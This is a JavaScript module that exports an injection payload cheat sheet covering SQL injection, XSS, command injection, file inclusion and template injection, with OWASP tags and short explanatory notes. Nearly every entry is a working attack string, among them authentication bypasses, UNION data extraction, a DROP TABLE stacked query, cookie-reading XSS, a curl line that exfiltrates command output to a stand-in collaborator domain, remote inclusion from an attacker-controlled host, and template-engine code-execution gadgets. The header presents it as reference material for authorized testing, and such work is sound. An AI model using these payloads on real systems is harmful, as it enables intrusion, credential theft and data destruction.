/**
 * Static injection payload cheatsheet — reference only. This is a
 * browsable/searchable list of well-known proof-of-concept snippets,
 * the same category of public reference as PortSwigger's cheat sheets
 * and the PayloadsAllTheThings GitHub repo. Nothing here sends any
 * payload anywhere — there is no submit/target field, just text to copy
 * into a tool/request YOU control against a system YOU are authorized to
 * test.
 */

export const INJECTION_PAYLOADS = [
  // ---------------- SQL Injection ----------------
  { category: 'SQLi', owasp: 'A03:2021 – Injection', name: "Auth bypass — always-true OR", payload: "' OR '1'='1", note: 'Classic authentication-bypass payload for a login form concatenating input directly into a WHERE clause.' },
  { category: 'SQLi', owasp: 'A03:2021 – Injection', name: 'Auth bypass — comment out rest of query', payload: "admin'--", note: "Closes the quoted string and comments out the remainder of the query (password check), if the input is string-concatenated." },
  { category: 'SQLi', owasp: 'A03:2021 – Injection', name: 'UNION-based column count probe', payload: "' ORDER BY 1--", note: 'Binary-search the column count of the original query by incrementing the ORDER BY index until it errors.' },
  { category: 'SQLi', owasp: 'A03:2021 – Injection', name: 'UNION-based data extraction', payload: "' UNION SELECT username, password FROM users--", note: 'Once column count and types are known, UNION SELECT pulls data from another table into the visible output.' },
  { category: 'SQLi', owasp: 'A03:2021 – Injection', name: 'Boolean-based blind', payload: "' AND 1=1--  vs  ' AND 1=2--", note: 'Compares the page response for a true vs. false condition to infer data one bit at a time when there is no visible error/output.' },
  { category: 'SQLi', owasp: 'A03:2021 – Injection', name: 'Time-based blind (MySQL)', payload: "' AND IF(1=1, SLEEP(5), 0)--", note: 'Confirms blind injection by observing a deliberate response-time delay instead of a boolean difference.' },
  { category: 'SQLi', owasp: 'A03:2021 – Injection', name: 'Stacked query (if supported)', payload: "'; DROP TABLE users;--", note: 'Only works where the driver/API allows multiple statements per query — demonstrates why stacked queries should be disabled for user input.' },

  // ---------------- Cross-Site Scripting (XSS) ----------------
  { category: 'XSS', owasp: 'A03:2021 – Injection', name: 'Basic alert PoC', payload: '<script>alert(document.domain)</script>', note: 'The canonical proof-of-concept — confirms script execution and shows which origin the payload runs under.' },
  { category: 'XSS', owasp: 'A03:2021 – Injection', name: 'IMG onerror (filters out <script>)', payload: '<img src=x onerror=alert(1)>', note: 'Bypasses naive filters that only strip literal <script> tags by using an event-handler attribute instead.' },
  { category: 'XSS', owasp: 'A03:2021 – Injection', name: 'SVG onload', payload: '<svg onload=alert(1)>', note: 'Another tag/attribute combination that survives some blocklist-based filters.' },
  { category: 'XSS', owasp: 'A03:2021 – Injection', name: 'javascript: URI', payload: 'javascript:alert(document.cookie)', note: "Triggers when user input lands in an href/src attribute that's rendered without scheme validation." },
  { category: 'XSS', owasp: 'A03:2021 – Injection', name: 'Attribute-breakout', payload: '"><script>alert(1)</script>', note: "Closes an existing HTML attribute's quotes before injecting a new tag — for input reflected inside an attribute value." },
  { category: 'XSS', owasp: 'A03:2021 – Injection', name: 'Polyglot (fires in multiple contexts)', payload: "jaVasCript:/*-/*\\`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", note: 'Designed to trigger across several different HTML/JS contexts at once when the exact injection context is unknown.' },

  // ---------------- Command Injection ----------------
  { category: 'Command Injection', owasp: 'A03:2021 – Injection', name: 'Chained command (semicolon)', payload: '; whoami', note: 'Terminates the intended command and runs a second one — works when input is passed unsanitized to a shell.' },
  { category: 'Command Injection', owasp: 'A03:2021 – Injection', name: 'Chained command (pipe)', payload: '| whoami', note: 'Pipes the intended command\'s output into a new command, or runs the new command if the first fails silently.' },
  { category: 'Command Injection', owasp: 'A03:2021 – Injection', name: 'Command substitution', payload: '`whoami`  or  $(whoami)', note: 'Injects a subshell that executes and substitutes its output inline — works even without a command separator.' },
  { category: 'Command Injection', owasp: 'A03:2021 – Injection', name: 'Blind — out-of-band confirmation', payload: '; curl http://YOUR-COLLABORATOR-DOMAIN/$(whoami)', note: 'For blind command injection with no visible output: exfiltrate a command result via an outbound DNS/HTTP request to infrastructure you control.' },
  { category: 'Command Injection', owasp: 'A03:2021 – Injection', name: 'Windows chained command', payload: '& whoami', note: 'Windows cmd.exe equivalent chaining operator (also try && to require the first command to succeed).' },

  // ---------------- LFI / RFI ----------------
  { category: 'LFI/RFI', owasp: 'A01:2021 – Broken Access Control', name: 'Basic path traversal', payload: '../../../../etc/passwd', note: 'Classic directory-traversal read of a well-known Linux file, to confirm the parameter controls a filesystem path.' },
  { category: 'LFI/RFI', owasp: 'A01:2021 – Broken Access Control', name: 'Null byte truncation (legacy PHP < 5.3.4)', payload: '../../../../etc/passwd%00.jpg', note: 'On very old PHP versions, a null byte truncates an appended extension the application forces onto the path.' },
  { category: 'LFI/RFI', owasp: 'A01:2021 – Broken Access Control', name: 'PHP wrapper — filter chain source disclosure', payload: 'php://filter/convert.base64-encode/resource=index.php', note: "Reads a server-side script's own source as base64 instead of letting PHP execute it — useful when direct traversal is blocked." },
  { category: 'LFI/RFI', owasp: 'A01:2021 – Broken Access Control', name: 'Remote file inclusion (RFI)', payload: 'http://attacker-controlled-host/shell.txt', note: "Only relevant where allow_url_include is enabled (rare/deprecated) — includes and executes a file from a host you control, in an authorized test." },
  { category: 'LFI/RFI', owasp: 'A01:2021 – Broken Access Control', name: 'Log poisoning target file', payload: '../../../../var/log/apache2/access.log', note: 'Paired with injecting a PHP payload into a request header logged by the webserver, then including the log file to execute it.' },

  // ---------------- SSTI (Server-Side Template Injection) ----------------
  { category: 'SSTI', owasp: 'A03:2021 – Injection', name: 'Generic detection probe', payload: '${7*7}  or  {{7*7}}', note: 'If the rendered output shows "49" instead of the literal text, the input is being evaluated by a template engine — confirms SSTI before choosing an engine-specific payload.' },
  { category: 'SSTI', owasp: 'A03:2021 – Injection', name: 'Jinja2 (Python/Flask) — RCE', payload: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", note: 'Escapes the sandbox via Python\'s object introspection to reach os.popen once Jinja2 SSTI is confirmed.' },
  { category: 'SSTI', owasp: 'A03:2021 – Injection', name: 'Twig (PHP) — RCE', payload: "{{['id']|filter('system')}}", note: 'Twig-specific gadget chaining the filter() function to system() once basic {{7*7}} confirms Twig evaluation.' },
  { category: 'SSTI', owasp: 'A03:2021 – Injection', name: 'FreeMarker (Java) — RCE', payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', note: "Uses FreeMarker's own utility classes, reachable from inside the template sandbox, to spawn a process." }
];
